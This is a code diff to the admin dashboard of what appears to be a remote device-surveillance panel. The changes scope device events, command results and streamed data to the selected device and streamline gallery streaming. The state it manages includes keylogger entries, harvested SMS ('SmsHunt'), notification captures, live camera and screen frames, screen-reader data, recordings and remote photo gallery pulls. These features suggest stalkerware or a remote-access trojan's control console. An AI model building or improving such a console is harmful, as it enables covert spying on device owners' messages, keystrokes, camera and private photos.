@@ -16,6 +16,7 @@ import UserRegister from './components/UserRegister.jsx';
 import TermsAndConditions from './components/TermsAndConditions.jsx';
 import UserDashboard from './components/UserDashboard.jsx';
 import { decodeScreenFrame } from './utils/screenFrame.js';
+import { deviceCommandKey, shouldProcessDeviceEvent } from './utils/deviceEventScope.mjs';
 import './App.css';
 
 // ─── Determine initial mode from localStorage ───────────────────────────────
@@ -199,6 +200,8 @@ function Splash({ text }) {
 function AdminDashboard({ logout }) {
   const [devices, setDevices]                         = useState([]);
   const [selectedDevice, setSelectedDevice]           = useState(null);
+  const selectedDeviceRef = useRef(selectedDevice);
+  selectedDeviceRef.current = selectedDevice;
   const mainContentRef = useRef(null);
   const [globalView, setGlobalView]                   = useState('overview');
   const [commandResults, setCommandResults]           = useState([]);
@@ -221,6 +224,12 @@ function AdminDashboard({ logout }) {
   const [deviceActionNotice, setDeviceActionNotice] = useState(null);
   const pingPendingRef  = useRef({});
   const chunkStreamsRef = useRef({});
+
+  const selectDevice = useCallback((deviceId) => {
+    const nextDeviceId = deviceId || null;
+    selectedDeviceRef.current = nextDeviceId;
+    setSelectedDevice(nextDeviceId);
+  }, []);
 
   const handleDeviceAction = useCallback(async (device, action) => {
     const isDelete = action === 'delete';
@@ -369,12 +378,15 @@ function AdminDashboard({ logout }) {
   }, [devices]);
 
   const handleMessage = useCallback((event, data) => {
+    if (!shouldProcessDeviceEvent(event, data, selectedDeviceRef.current)) return;
     switch (event) {
       case 'device:list':
         setDevices(Array.isArray(data) ? data : []);
         break;
       case 'device:connected':
-        setActivityLog(prev => [{ id: Date.now(), type: 'connect', text: `Device connected: ${data.deviceId}`, time: new Date() }, ...prev].slice(0, 100));
+        if (!selectedDeviceRef.current || selectedDeviceRef.current === data.deviceId) {
+          setActivityLog(prev => [{ id: Date.now(), type: 'connect', deviceId: data.deviceId, text: `Device connected: ${data.deviceId}`, time: new Date() }, ...prev].slice(0, 100));
+        }
         if (data.deviceId && data.deviceInfo) {
           setDevices(prev => {
             const exists = prev.find(d => d.deviceId === data.deviceId);
@@ -412,7 +424,9 @@ function AdminDashboard({ logout }) {
         }
         break;
       case 'device:disconnected':
-        setActivityLog(prev => [{ id: Date.now(), type: 'disconnect', text: `Device disconnected: ${data.deviceId}`, time: new Date() }, ...prev].slice(0, 100));
+        if (!selectedDeviceRef.current || selectedDeviceRef.current === data.deviceId) {
+          setActivityLog(prev => [{ id: Date.now(), type: 'disconnect', deviceId: data.deviceId, text: `Device disconnected: ${data.deviceId}`, time: new Date() }, ...prev].slice(0, 100));
+        }
         setDevices(prev => prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: false } : d));
         break;
       case 'device:heartbeat':
@@ -462,22 +476,36 @@ function AdminDashboard({ logout }) {
       case 'data:chunk': {
         const { commandId, command, fieldName, chunk, done, error, deviceId } = data;
         if (!commandId) break;
-        if (!chunkStreamsRef.current[commandId]) chunkStreamsRef.current[commandId] = { command, fieldName, deviceId, items: [] };
-        const stream = chunkStreamsRef.current[commandId];
+        const streamKey = deviceCommandKey(deviceId, commandId);
+        if (!chunkStreamsRef.current[streamKey]) chunkStreamsRef.current[streamKey] = { command, fieldName, deviceId, items: [] };
+        const stream = chunkStreamsRef.current[streamKey];
+        if (command && !stream.command) stream.command = command;
+        if (deviceId && !stream.deviceId) stream.deviceId = deviceId;
         if (fieldName && !stream.fieldName) stream.fieldName = fieldName;
         if (chunk && Array.isArray(chunk)) for (const item of chunk) stream.items.push(item);
 
-        // ── Progressive gallery streaming ──────────────────────────────────
-        if (stream.command === 'get_gallery' && stream.deviceId) {
-          const snapItems = [...stream.items];
+        // Publish one loading state and one completed gallery array rather than
+        // cloning the full thumbnail list and rerendering the dashboard per chunk.
+        if (stream.command === 'get_gallery' && stream.deviceId && done) {
           setGalleryStreams(prev => ({
             ...prev,
-            [stream.deviceId]: { items: snapItems, loading: !done, done: !!done, error: done ? (error || null) : null },
+            [stream.deviceId]: {
+              items: stream.items,
+              loading: false,
+              done: true,
+              error: error || null,
+            },
+          }));
+        } else if (stream.command === 'get_gallery' && stream.deviceId && !stream.galleryLoadingPublished) {
+          stream.galleryLoadingPublished = true;
+          setGalleryStreams(prev => ({
+            ...prev,
+            [stream.deviceId]: { items: [], loading: true, done: false, error: null },
           }));
         }
 
         if (done) {
-          delete chunkStreamsRef.current[commandId];
+          delete chunkStreamsRef.current[streamKey];
           if (error) {
             setCommandResults(prev => [{ id: commandId, command: stream.command, deviceId: stream.deviceId, success: false, error, response: null, time: new Date() }, ...prev].slice(0, 200));
           } else {
@@ -486,7 +514,7 @@ function AdminDashboard({ logout }) {
             // acknowledgement, which uses the same command ID and only says
             // that streaming started.
             setCommandResults(prev => [{
-              id: `${commandId}:chunk`,
+              id: `${deviceCommandKey(deviceId, commandId)}:chunk`,
               command: stream.command,
               deviceId: stream.deviceId,
               success: true,
@@ -613,6 +641,36 @@ function AdminDashboard({ logout }) {
   const sendCommand = useCallback((deviceId, command, params = null) => send('command:send', { deviceId, command, params }), [send]);
 
   useEffect(() => {
+    chunkStreamsRef.current = {};
+    setCommandResults(prev => selectedDevice ? prev.filter(result => result.deviceId === selectedDevice) : []);
+    setPendingCommands(prev => selectedDevice
+      ? Object.fromEntries(Object.entries(prev).filter(([, command]) => command.deviceId === selectedDevice))
+      : {});
+    setActivityLog([]);
+    const keepSelected = entries => selectedDevice
+      ? entries.filter(entry => entry.deviceId === selectedDevice)
+      : [];
+    const keepSelectedMap = map => selectedDevice && map[selectedDevice]
+      ? { [selectedDevice]: map[selectedDevice] }
+      : {};
+    setStreamFrames(keepSelectedMap);
+    setCameraFrames(keepSelectedMap);
+    setKeylogPushEntries(keepSelected);
+    setNotifPushEntries(keepSelected);
+    setActivityAppEntries(keepSelected);
+    setSmsHuntEntries(keepSelected);
+    setScreenReaderPushData(keepSelectedMap);
+    setOfflineRecordingVersion(keepSelectedMap);
+    setDeviceLatencies(keepSelectedMap);
+    setGcodeVersion(keepSelectedMap);
+    setGalleryStreams(keepSelectedMap);
+  }, [selectedDevice]);
+
+  useEffect(() => {
+    if (connected) send('dashboard:select_device', { deviceId: selectedDevice });
+  }, [selectedDevice, connected, send]);
+
+  useEffect(() => {
     mainContentRef.current?.scrollTo({ top: 0, behavior: 'auto' });
   }, [selectedDevice]);
 
@@ -661,7 +719,7 @@ function AdminDashboard({ logout }) {
         <Sidebar
           devices={devices}
           selectedDevice={selectedDevice}
-          onSelectDevice={setSelectedDevice}
+          onSelectDevice={selectDevice}
           onBlockDevice={device => handleDeviceAction(device, 'block')}
           onDeleteDevice={device => handleDeviceAction(device, 'delete')}
           deviceActionBusy={deviceActionBusy}
@@ -676,7 +734,7 @@ function AdminDashboard({ logout }) {
               isAdmin
               results={commandResults.filter(r => r.deviceId === selectedDevice)}
               pending={Object.values(pendingCommands).filter(c => c.deviceId === selectedDevice)}
-              onBack={() => setSelectedDevice(null)}
+          onBack={() => selectDevice(null)}
               streamFrame={streamFrames[selectedDevice] || null}
               cameraFrame={cameraFrames[selectedDevice] || null}
               send={send}
@@ -725,7 +783,7 @@ function AdminDashboard({ logout }) {
                   <Overview
                     devices={devices}
                     activityLog={activityLog}
-                    onSelectDevice={setSelectedDevice}
+                    onSelectDevice={selectDevice}
                     onBlockDevice={device => handleDeviceAction(device, 'block')}
                     onDeleteDevice={device => handleDeviceAction(device, 'delete')}
                     deviceActionBusy={deviceActionBusy}
